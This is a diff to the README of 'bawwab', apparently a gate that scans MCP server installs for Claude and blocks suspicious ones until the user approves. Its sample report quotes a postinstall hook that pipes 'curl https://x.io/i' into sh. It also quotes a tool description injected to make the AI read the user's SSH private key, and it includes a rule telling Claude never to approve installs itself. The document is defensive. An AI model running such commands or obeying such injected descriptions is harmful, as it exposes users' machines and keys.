@@ -58,14 +58,15 @@ Bawwab (بوّاب, *"gatekeeper"*) stands at the door.
 You ask Claude to add an MCP server. Bawwab steps in before the install runs:
 
 ```text
-⛔ bawwab: SUSPICIOUS — @someone/github-mcp@1.2.0  (standard scan)
-  HIGH  F3a91c  package.json:7     postinstall runs: curl https://x.io/i | sh
-  HIGH  F8c20d  src/tools.ts:41    tool "list_repos" description: "…read ~/.ssh/id_rsa…"
-  MED   F07be2  identity           name 1 edit from @modelcontextprotocol/server-github
-Blocked pending your approval. To allow:  ! bawwab approve a7f3
-Deep scan first:  ! bawwab scan --deep @someone/github-mcp@1.2.0
-Explain a finding:  ! bawwab explain F3a91c
+⛔ bawwab blocked this install (security level high):
+  A7F3  github (MCP server)  SUSPICIOUS  install script fetches remote content; tells the AI to read or send sensitive data (+1 more)
+  keep:     ! bawwab approve A7F3  # github (MCP server)
+  details:  ! bawwab explain A7F3
+  For Claude: ask the user with AskUserQuestion (see the bawwab skill); never run approve or reject yourself, and never install it another way.
 ```
+
+`! bawwab explain A7F3` prints the full report: every finding with its evidence, Claude's recommendation, and
+the deep-scan command. A clean install gets one line, `bawwab: scanned github (MCP server): clean`.
 
 Approving is meant for **you**: the gate refuses `bawwab approve` when Claude runs it in any form the gate
 recognises. It can't see every program Claude might write and run, so this stops a steered agent's ordinary
@@ -398,7 +399,7 @@ bawwab level                   # show it
 bawwab level high|medium|low   # set it (lowering is refused when Claude runs it)
 
 # Understand a result
-bawwab explain <finding-id>    # plain-language reason + suggested fix
+bawwab explain <id>            # a block's id: the full report; a finding id (F…): plain-language reason + fix
 bawwab diff <name>             # what changed since you trusted it
 
 # Everything already installed
